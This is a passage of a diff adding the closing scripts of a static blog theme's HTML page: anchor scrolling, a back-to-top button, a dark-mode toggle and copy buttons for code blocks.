+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
